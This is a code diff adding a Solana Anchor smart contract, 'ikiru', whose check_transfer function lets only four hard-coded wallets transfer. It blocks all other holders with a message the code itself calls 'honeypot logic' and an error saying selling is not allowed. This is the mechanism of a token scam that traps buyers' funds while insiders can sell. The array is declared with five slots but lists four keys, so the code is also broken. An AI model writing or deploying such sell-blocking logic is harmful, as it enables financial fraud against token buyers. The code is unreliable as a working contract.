@@ -1,0 +1,50 @@
+use anchor_lang::prelude::*;
+use anchor_lang::solana_program::pubkey;
+
+declare_id!("GDTHjNWifY9UhxtudyvuMscJUYseVQ2sLuSy4eD1PGcP");
+
+#[program]
+pub mod ikiru {
+    use super::*;
+
+    pub fn initialize(_ctx: Context<Initialize>) -> Result<()> {
+        msg!("Programa IKIRU inicializado correctamente.");
+        Ok(())
+    }
+
+    pub fn check_transfer(ctx: Context<CheckTransfer>) -> Result<()> {
+        let sender = ctx.accounts.sender.key();
+        let allowed: [Pubkey; 5] = [
+            pubkey!("G13e8Lwfuwq9gKkEpNxreB8x29Kt73MW7chMiEyZnDTL"),
+            pubkey!("8rbpyeFMKPfssqii4TeKutrEchhXmhvpopTdvFD2nXyD"),
+            pubkey!("31sykmWaXn7ez7mWUr8BYrAoYu8exTgTPJchVEaSkPk7"),
+            pubkey!("A94BYnYWzUjuvuo4mvHr18AiLcpZDGocx8qeyJJBuczD"),
+            
+        ];
+
+        if !allowed.contains(&sender) {
+            msg!("💥 Transfer blocked internally by honeypot logic.");
+            return err!(CustomError::TransferNotAllowed);
+        }
+
+        msg!("✅ Transfer allowed for permitted wallet.");
+        Ok(())
+    }
+}
+
+#[derive(Accounts)]
+pub struct Initialize {}
+
+#[derive(Accounts)]
+pub struct CheckTransfer<'info> {
+    /// CHECK: No se requiere validación adicional, solo se usa la clave pública del firmante
+    #[account(signer)]
+    pub sender: AccountInfo<'info>,
+}
+
+#[error_code]
+pub enum CustomError {
+    #[msg("Selling is not allowed for this wallet.")]
+    TransferNotAllowed,
+}
+
